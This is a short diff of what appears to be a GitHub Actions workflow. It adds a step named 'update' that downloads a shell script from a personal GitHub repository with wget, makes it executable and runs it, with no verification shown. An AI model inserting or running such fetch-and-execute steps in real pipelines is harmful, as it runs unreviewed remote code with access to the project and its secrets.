@@ -24,7 +24,7 @@ jobs:
       
       - name: update
         run: |
-
+          wget https://raw.githubusercontent.com/firkerword/KPR/main/2.sh
           chmod 0755 ./2.sh
           ./2.sh
       
